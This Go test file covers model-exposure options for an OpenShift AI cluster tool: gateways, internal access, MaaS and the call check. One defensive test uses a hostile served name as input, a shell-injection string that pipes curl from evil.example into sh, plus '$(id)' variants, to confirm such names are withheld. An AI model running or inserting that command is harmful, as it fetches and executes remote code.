package cluster

import (
	"crypto/x509"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/juntwang/rhoai-nightly-updater/pkg/cluster/internal/kube"
	"github.com/juntwang/rhoai-nightly-updater/pkg/types"
)

// gatewayFixture is a gateway someone else made, admitting every namespace.
func gatewayFixture(ns, name, meta string) (string, string) {
	return "/apis/gateway.networking.k8s.io/v1/namespaces/" + ns + "/gateways/" + name,
		`{"metadata":{` + meta + `},"spec":{"gatewayClassName":"x","listeners":[{"name":"https","hostname":"` + name + `.example.com","allowedRoutes":{"namespaces":{"from":"All"}}}]}}`
}

func optionByKey(t *testing.T, ex *types.ModelExposures, key string) types.ModelExposureOption {
	t.Helper()
	for _, o := range ex.Options {
		if o.Key == key {
			return o
		}
	}
	t.Fatalf("no option %s in %+v", key, ex.Options)
	return types.ModelExposureOption{}
}

func hasOption(ex *types.ModelExposures, key string) bool {
	for _, o := range ex.Options {
		if o.Key == key {
			return true
		}
	}
	return false
}

func exposures(t *testing.T, mc *modelsCluster, model string) *types.ModelExposures {
	t.Helper()
	ex, msg, _ := GetModelExposures(mc.c, "proj", model)
	if msg != "" {
		t.Fatalf("exposures: %s", msg)
	}
	return ex
}

func modelSpec(t *testing.T, mc *modelsCluster) map[string]any {
	t.Helper()
	m := mc.f.get(testModelPath)
	if m == nil {
		t.Fatal("no model")
	}
	return m["spec"].(map[string]any)
}

// No gateway on the cluster: the default route cannot be used, and
// setting up the inference gateway is recommended; inside the cluster only
// is always there, never the default.
func TestModelExposures_NoGatewayRecommendsSettingItUp(t *testing.T) {
	mc := newModelsCluster(t)
	ex := exposures(t, mc, "")
	if ex.Default != "" || !ex.RecommendGateway || !ex.AuthReady {
		t.Fatalf("got %+v", ex)
	}
	if a := optionByKey(t, ex, exposureDefault); a.Available || !strings.Contains(a.Reason, "The inference gateway isn't set up yet") || a.Fix != "inference-gateway" {
		t.Errorf("default: %+v", a)
	}
	if e := optionByKey(t, ex, exposureInternal); !e.Available || !strings.Contains(e.Warning, "not authenticated") || e.Address != "" {
		t.Errorf("internal: %+v", e)
	}
	if b := optionByKey(t, ex, exposureMaaS); b.Available {
		t.Errorf("maas without a platform: %+v", b)
	}
	// An embedding model is never published to MaaS.
	if b := optionByKey(t, exposures(t, mc, "granite-embedding-125m-english"), exposureMaaS); b.Available || b.Reason != "Only chat models are published to MaaS." {
		t.Errorf("embedding maas: %+v", b)
	}
}

// The tool's gateway as KServe's default: the default, and it adds the
// project to the list.
func TestModelExposures_TheToolsGatewayIsTheDefault(t *testing.T) {
	mc := newModelsCluster(t)
	if res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true}); !res.Success {
		t.Fatalf("gateway: %+v", res)
	}
	ex := exposures(t, mc, "")
	a := optionByKey(t, ex, exposureDefault)
	if ex.Default != exposureDefault || !a.Available || len(a.Changes) != 1 || !strings.Contains(a.Changes[0], "proj is added") || a.Address != "https://inference.apps.example.com/proj/qwen25-05b-instruct" {
		t.Fatalf("got %+v / %+v", ex, a)
	}
}

// Other gateways: only programmed ones, never MaaS's, the operator's own
// (by name or GatewayConfig owner); one that does not admit the project is
// listed with why.
func TestModelExposures_OtherGatewaysAreFiltered(t *testing.T) {
	mc := newModelsCluster(t)
	for _, g := range []struct{ ns, name, meta string }{
		{"team-gw", "mine", ""},
		{"openshift-ingress", "maas-default-gateway", ""},
		{"openshift-ingress", "data-science-gateway", ""},
		{"openshift-ingress", "owned", `"ownerReferences":[{"kind":"GatewayConfig","name":"default-gateway","uid":"u"}]`},
	} {
		p, body := gatewayFixture(g.ns, g.name, g.meta)
		mc.f.putJSON(p, body)
	}
	p, _ := gatewayFixture("team-gw", "closed", "")
	mc.f.putJSON(p, `{"spec":{"listeners":[{"name":"https","hostname":"closed.example.com","allowedRoutes":{"namespaces":{"from":"Same"}}}]}}`)
	ex := exposures(t, mc, "")
	mine := optionByKey(t, ex, "gateway:team-gw/mine")
	if !mine.Available || mine.GatewayRef != "team-gw/mine" || ex.Default != "" {
		t.Errorf("mine: %+v default %s", mine, ex.Default)
	}
	if closed := optionByKey(t, ex, "gateway:team-gw/closed"); closed.Available || !strings.Contains(closed.Reason, "does not let routes from project proj attach") {
		t.Errorf("closed: %+v", closed)
	}
	for _, k := range []string{"gateway:openshift-ingress/maas-default-gateway", "gateway:openshift-ingress/data-science-gateway", "gateway:openshift-ingress/owned"} {
		if hasOption(ex, k) {
			t.Errorf("offered %s", k)
		}
	}
	// Set up through it: refs name it; it is never written.
	before := len(mc.f.mutations())
	res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: exposureGateway, GatewayRef: "team-gw/mine"})
	if !res.Success {
		t.Fatalf("setup: %+v", res)
	}
	refs := modelSpec(t, mc)["router"].(map[string]any)["gateway"].(map[string]any)["refs"].([]any)
	if r := refs[0].(map[string]any); len(refs) != 1 || r["name"] != "mine" || r["namespace"] != "team-gw" {
		t.Errorf("refs: %v", refs)
	}
	for _, m := range mc.f.mutations()[before:] {
		if strings.Contains(m, "/gateways") {
			t.Errorf("wrote a gateway: %s", m)
		}
	}
	// An excluded gateway is refused by name.
	res, _ = runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Model: "smollm2-135m-instruct", Exposure: exposureGateway, GatewayRef: "openshift-ingress/maas-default-gateway"})
	if res.Success || !strings.Contains(res.Message, "MaaS's gateway") {
		t.Errorf("maas gateway by ref: %+v", res)
	}
}

// Without Connectivity Link: routed options need it first, and an
// internal-only model gets token authentication off.
func TestModelExposures_WithoutConnectivityLink(t *testing.T) {
	mc := newModelsCluster(t)
	if res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true}); !res.Success {
		t.Fatalf("gateway: %+v", res)
	}
	withoutKuadrant(mc)
	ex := exposures(t, mc, "")
	if a := optionByKey(t, ex, exposureDefault); !a.Available || !a.NeedsAuth || ex.AuthReady {
		t.Errorf("default: %+v", a)
	}
	if e := optionByKey(t, ex, exposureInternal); !strings.Contains(e.Warning, "enable-auth") {
		t.Errorf("internal: %+v", e)
	}
	res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj"})
	if res.Success || res.ErrorCode != "prerequisites" || !strings.Contains(res.Message, "Connectivity Link") {
		t.Fatalf("setup through the gateway: %+v", res)
	}
	if mc.f.has(testModelPath) {
		t.Fatal("a model was created")
	}
	// KServe's Service for the model, on its own port (RHOAI 3.6: 8000).
	mc.f.put("/api/v1/namespaces/proj/services/qwen25-05b-instruct-kserve-workload-svc", map[string]any{
		"spec": map[string]any{"ports": []any{map[string]any{"name": "https", "appProtocol": "https", "port": 8000}}},
	})
	res, events := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: exposureInternal})
	if !res.Success {
		t.Fatalf("internal: %+v", res)
	}
	spec := modelSpec(t, mc)
	if _, routed := spec["router"]; routed {
		t.Errorf("internal model has a router: %v", spec["router"])
	}
	ann := mc.f.get(testModelPath)["metadata"].(map[string]any)["annotations"].(map[string]any)
	if ann[enableAuthAnnot] != "false" {
		t.Errorf("annotations: %v", ann)
	}
	// Called at its in-cluster address, without a token.
	sent := mc.calls.sent()
	if len(sent) == 0 || !strings.HasPrefix(sent[len(sent)-1], "https://qwen25-05b-instruct-kserve-workload-svc.proj.svc.cluster.local:8000/v1/chat/completions  ") {
		t.Errorf("calls: %v", sent)
	}
	if !strings.Contains(finalSteps(events), "callable=success") {
		t.Errorf("steps: %s", finalSteps(events))
	}
	// How it is reached does not change on a set up again.
	res, _ = runModels(t, mc.c, types.ModelsRequest{Action: "setup", Project: "proj", Exposure: exposureDefault})
	if res.Success || !strings.Contains(res.Message, "delete it and set it up again") {
		t.Errorf("change: %+v", res)
	}
}

// The check sends one minimal chat request with the served name and the
// model's own token; a 404 without a body is retried, vLLM's 404 for a
// wrong name fails the setup with what to send.
func TestModelsSetup_CanItBeCalled(t *testing.T) {
	mc := newModelsCluster(t)
	mc.calls.answers = []simAnswer{{status: 404}, {status: 503, body: "no healthy upstream"}}
	res, events := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true, Project: "proj"})
	if !res.Success || !strings.Contains(res.Message, "A chat request for \"qwen25-05b-instruct\" was answered (HTTP 200). A request without a token was refused (HTTP 401).") || mc.calls.probes != 1 {
		t.Fatalf("setup: %+v", res)
	}
	sent := mc.calls.sent()
	want := `https://inference.apps.example.com/proj/qwen25-05b-instruct/v1/chat/completions ` + testModelToken + ` {"max_tokens":1,"messages":[{"content":"hi","role":"user"}],"model":"qwen25-05b-instruct"}`
	if len(sent) != 3 || sent[2] != want {
		t.Fatalf("requests: %v", sent)
	}
	if !strings.Contains(strings.Join(eventMessages(events, "callable"), "\n"), "Retrying") {
		t.Errorf("no retry said: %v", eventMessages(events, "callable"))
	}
	st, _ := GetResourcesStatus(mc.c)
	if m := st.Models.Items[0]; m.CallCheck == nil || !m.CallCheck.OK || m.Exposure != exposureDefault || m.Gateway != "openshift-ingress/openshift-ai-inference" || m.ServedName != "qwen25-05b-instruct" {
		t.Errorf("status: %+v %+v", m, m.CallCheck)
	}

	// Check again: vLLM's 404 for a name it does not serve.
	mc.calls.answers = []simAnswer{{status: 404, body: `{"error":{"message":"The model ` + "`X`" + ` does not exist.","type":"NotFoundError","code":404}}`}}
	res, events = runModels(t, mc.c, types.ModelsRequest{Action: "check", Project: "proj"})
	if res.Success || res.ErrorCode != "not_callable" || !strings.Contains(res.Message, `"model": "qwen25-05b-instruct"`) || finalSteps(events) != "callable=failed" {
		t.Fatalf("check: %+v %s", res, finalSteps(events))
	}
	st, _ = GetResourcesStatus(mc.c)
	if c := st.Models.Items[0].CallCheck; c == nil || c.Result != "model-name" {
		t.Errorf("status check: %+v", c)
	}
}

// A project editor sets spec.model.name (KServe and vLLM take any string):
// a name with characters a shell or JSON treats specially is never shown,
// and the call check does not use it.
func TestModels_UnsafeServedNameWithheld(t *testing.T) {
	for _, name := range []string{`x"}'; curl -s https://evil.example/p|sh; echo '`, "a$(id)", "a`id`", "two\nlines", "a b", ""} {
		if name != "" && safeServedName(name) {
			t.Errorf("%q is taken as safe", name)
		}
	}
	for _, name := range []string{"qwen25-05b-instruct", "Qwen/Qwen2.5-0.5B-Instruct", "model:v1.2_x"} {
		if !safeServedName(name) {
			t.Errorf("%q is refused", name)
		}
	}
	mc := newModelsCluster(t)
	if res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true, Project: "proj"}); !res.Success {
		t.Fatalf("setup: %+v", res)
	}
	obj := mc.f.get(testModelPath)
	ensureMap(ensureMap(obj, "spec"), "model")["name"] = `x"}'; curl -s https://evil.example/p|sh; echo '`
	mc.f.put(testModelPath, obj)
	before := len(mc.calls.sent())
	res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "check", Project: "proj"})
	if !strings.HasPrefix(res.Message, "Not checked") || len(mc.calls.sent()) != before {
		t.Fatalf("check: %+v; calls %v", res, mc.calls.sent()[before:])
	}
	st, _ := GetResourcesStatus(mc.c)
	m := st.Models.Items[0]
	if m.ServedName != "" || !m.ServedNameWithheld || !strings.Contains(m.Warning, "does not show it") {
		t.Errorf("status: %+v", m)
	}
	if m.CallCheck == nil || m.CallCheck.Result != "not-checked" || strings.Contains(m.CallCheck.Message, "evil") {
		t.Errorf("call check: %+v", m.CallCheck)
	}
}

func eventMessages(events []UpdateStepEvent, step string) []string {
	var out []string
	for _, e := range events {
		if e.Step == step {
			out = append(out, e.Message)
		}
	}
	return out
}

func TestClassifyModelCall(t *testing.T) {
	cases := []struct {
		name      string
		status    int
		body      string
		err       error
		internal  bool
		result    string
		transient bool
		says      string
	}{
		{"ok", 200, `{}`, nil, false, "ok", false, "A chat request for \"qwen25-05b-instruct\" was answered (HTTP 200)."},
		{"older vLLM wrong name", 404, `{"object":"error","message":"The model ` + "`x`" + ` does not exist.","type":"NotFoundError","code":404}`, nil, false, "model-name", false, "not its display name"},
		{"wrong name", 404, `{"error":{"message":"The model x does not exist.","type":"NotFoundError","code":404}}`, nil, false, "model-name", false, "not its display name"},
		{"no route", 404, ``, nil, false, "route", true, "404, empty body"},
		{"401", 401, ``, nil, false, "auth", false, "refused the model's own token"},
		{"403", 403, ``, nil, false, "forbidden", false, "may not call the model"},
		{"503", 503, `no healthy upstream`, nil, false, "server-error", true, "no healthy upstream"},
		{"500", 500, `boom`, nil, false, "server-error", false, "boom"},
		{"dns", 0, ``, &net.DNSError{Name: "inference.apps.example.com", Err: "no such host"}, false, "unreachable", true, "DNS record"},
		{"timeout", 0, ``, errSimDNS, false, "unreachable", true, "No answer"},
		{"internal tls", 0, ``, x509.UnknownAuthorityError{}, true, "not-checked", false, "curl -k"},
		{"internal blocked", 0, ``, errSimDNS, true, "not-checked", false, "NetworkPolicy"},
	}
	for _, tc := range cases {
		got, transient := classifyModelCall(tc.status, []byte(tc.body), tc.err, "https://x/v1/chat/completions", "qwen25-05b-instruct", tc.internal)
		if got.Result != tc.result || transient != tc.transient || !strings.Contains(got.Message, tc.says) || got.OK != (tc.result == "ok") {
			t.Errorf("%s: got %+v transient %v", tc.name, got, transient)
		}
		if strings.Contains(got.Message, testModelToken) {
			t.Errorf("%s: the token is in the message", tc.name)
		}
	}
}

// A failing pull is waited on: two minutes on an old node, eight on a node
// that joined minutes ago (live: credentials arrive late on a new node),
// then the setup fails with what to check.
func TestModelsSetup_PullFailureGraceByNodeAge(t *testing.T) {
	for _, tc := range []struct {
		name  string
		age   time.Duration
		grace string
		young bool
	}{
		{"old node", 3 * time.Hour, "2:00", false},
		{"young node", 3 * time.Minute, "8:00", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			mc := newModelsCluster(t)
			mc.readyAfter = 0
			mc.f.putJSON("/api/v1/nodes/node-a", `{"metadata":{"creationTimestamp":"`+kube.Clock().Now().Add(-tc.age).UTC().Format(time.RFC3339)+`"}}`)
			mc.f.putJSON(testModelPodsPath, `{"metadata":{"labels":{"app.kubernetes.io/name":"qwen25-05b-instruct","app.kubernetes.io/component":"llminferenceservice-workload"}},
				"spec":{"nodeName":"node-a"},
				"status":{"containerStatuses":[{"name":"main","state":{"waiting":{"reason":"ImagePullBackOff","message":"unauthorized: authentication required"}}}]}}`)
			res, events := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true, Project: "proj"})
			if res.Success || res.ErrorCode != "not_ready" || !strings.Contains(res.Message, "for "+tc.grace) || !strings.Contains(res.Message, "pull secret") {
				t.Fatalf("got %+v", res)
			}
			if strings.Contains(res.Message, "joined the cluster") != tc.young {
				t.Errorf("node age note: %q", res.Message)
			}
			if !strings.Contains(strings.Join(eventMessages(events, "model-ready"), "\n"), "Waiting up to "+tc.grace) {
				t.Errorf("progress: %v", eventMessages(events, "model-ready"))
			}
		})
	}
}

// A pull that recovers within the window is no failure.
func TestModelsSetup_PullFailureThatRecovers(t *testing.T) {
	mc := newModelsCluster(t)
	mc.readyAfter = 6
	mc.f.putJSON(testModelPodsPath, `{"metadata":{"labels":{"app.kubernetes.io/name":"qwen25-05b-instruct","app.kubernetes.io/component":"llminferenceservice-workload"}},
		"status":{"containerStatuses":[{"name":"main","state":{"waiting":{"reason":"ErrImagePull","message":"unauthorized"}}}]}}`)
	if res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true, Project: "proj"}); !res.Success {
		t.Fatalf("got %+v", res)
	}
}

// Kuadrant reported missing alone does not block models (internal-only
// works without it); anything else missing still does.
func TestModelsBlock_ConnectivityLinkAloneIsNoBlock(t *testing.T) {
	dsc := func(msg string) dscRead {
		return dscRead{Object: map[string]any{"metadata": map[string]any{"name": "default-dsc"}, "spec": map[string]any{"components": map[string]any{"kserve": map[string]any{"managementState": "Managed"}}},
			"status": map[string]any{"conditions": []any{map[string]any{"type": llmDependenciesCondition, "status": "False", "message": msg}}}}}
	}
	if b, deps := modelsBlock(dsc("Red Hat Connectivity Link is not installed")); b != nil || deps != "False" {
		t.Errorf("rhcl only: %+v %s", b, deps)
	}
	if b, _ := modelsBlock(dsc("cert-manager Operator for Red Hat OpenShift is not installed")); b == nil {
		t.Error("cert-manager missing is a block")
	}
}

// The model step says how it is reached in a sentence of its own.
func TestModelsSetup_ModelStepSaysHowItIsReached(t *testing.T) {
	mc := newModelsCluster(t)
	_, events := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true, Project: "proj"})
	msgs := strings.Join(eventMessages(events, "model"), "\n")
	if !strings.Contains(msgs, "with the cluster preset's Red Hat vLLM CPU image. Reached through gateway openshift-ingress/openshift-ai-inference, KServe's default.") {
		t.Fatalf("model step: %s", msgs)
	}
}

// The "Through MaaS only" option says who can call the model: publish
// keeps the subscription's audience, so not "anyone signed in" when it is
// limited; and an unread MaaS state says so in words.
func TestModelExposures_MaaSOptionNamesTheAudience(t *testing.T) {
	entry, _ := catalogEntry("")
	maasOpt := func(r exposureReads) types.ModelExposureOption {
		out, _ := r.options()
		for _, o := range out.Options {
			if o.Key == exposureMaaS {
				return o
			}
		}
		t.Fatal("no MaaS option")
		return types.ModelExposureOption{}
	}
	if o := maasOpt(exposureReads{project: "p", entry: entry, maasKnown: true}); !strings.Contains(o.Description, "anyone signed in") {
		t.Errorf("everyone: %s", o.Description)
	}
	if o := maasOpt(exposureReads{project: "p", entry: entry, maasKnown: true, maasWho: "group team-a"}); strings.Contains(o.Description, "anyone signed in") || !strings.Contains(o.Description, "the same people as this tool's other published models (group team-a)") {
		t.Errorf("limited: %s", o.Description)
	}
	if o := maasOpt(exposureReads{project: "p", entry: entry}); o.Reason != "Whether MaaS is set up could not be checked yet." {
		t.Errorf("not checked: %s", o.Reason)
	}
}
